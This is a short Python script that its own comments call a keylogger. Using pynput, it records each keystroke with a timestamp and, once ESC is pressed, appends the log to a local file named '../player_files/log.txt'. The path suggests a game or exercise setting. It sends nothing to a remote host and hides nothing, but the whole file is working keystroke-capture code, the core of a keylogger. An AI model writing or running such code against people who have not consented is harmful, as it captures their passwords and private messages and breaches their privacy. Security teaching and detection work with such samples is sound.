#!/usr/bin/python3

from pynput.keyboard import Key, Listener
from datetime import datetime

# Dictionary storing timestamp and keystrokes
log = dict()

# Keys that are 
def key_press(key):
    global log
    log[datetime.now().strftime("%D %H:%M:%S.%f")] = "{0}".format(key)

# Key used to terminate keylogger
def key_release(key):
    # Terminate if ESC button is 
    if key == (Key.esc):
        write()
        return False

# Write dictionary to file
def write():
    with open("../player_files/log.txt", "a") as file:
        for key, value in log.items():
            file.write(key + " - " + value + " \n")

with Listener(on_press=key_press, on_release=key_release) as listener:
    listener.join()